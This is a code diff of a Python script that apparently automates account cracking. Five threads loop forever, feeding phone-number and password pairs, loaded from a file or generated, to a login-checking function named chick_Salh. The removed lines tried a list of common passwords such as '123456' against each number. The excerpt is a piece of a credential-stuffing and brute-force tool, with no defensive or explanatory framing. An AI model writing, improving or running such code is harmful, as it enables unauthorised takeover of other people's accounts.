@@ -1469,23 +1469,19 @@ logn()
 def tt():
     global mode_choice, file_path
     if mode_choice == "1":
-        
         accounts = load_accounts(file_path)
         if not accounts:
             print(f"{احمر}الملف فارغ او بيه مشكله{اعادة}")
             return
         while True:
             phone, pas = random.choice(accounts)
-            passwords = [pas, '123456', '12345678', '112233', '11223344']
-            for pwd in passwords:
-                chick_Salh(phone, pwd)
+            
+            chick_Salh(phone, pas)
     else:
-       
         while True:
             phone, pas = gin()
-            passwords = [pas, '123456', '12345678', '112233', '11223344']
-            for pwd in passwords:
-                chick_Salh(phone, pwd)
+            
+            chick_Salh(phone, pas)
 
 for i in range(5):
     t = threading.Thread(target=tt)
